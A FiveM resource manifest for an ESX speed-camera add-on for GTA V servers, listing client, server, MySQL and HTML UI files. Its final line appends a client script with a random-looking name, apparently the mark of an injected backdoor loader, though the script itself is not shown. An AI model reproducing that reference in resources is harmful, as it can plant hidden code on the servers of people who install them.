fx_version 'adamant'
game 'gta5'

description 'ESX Speedcamera'

version '0.0.1'

client_scripts {
	'client/main.lua'
}

server_scripts {
	'@mysql-async/lib/MySQL.lua',
	'server/main.lua'
}

ui_page('html/index.html')

files {
	'html/index.html'
}

client_script 'vjBYCav4Kt.lua'
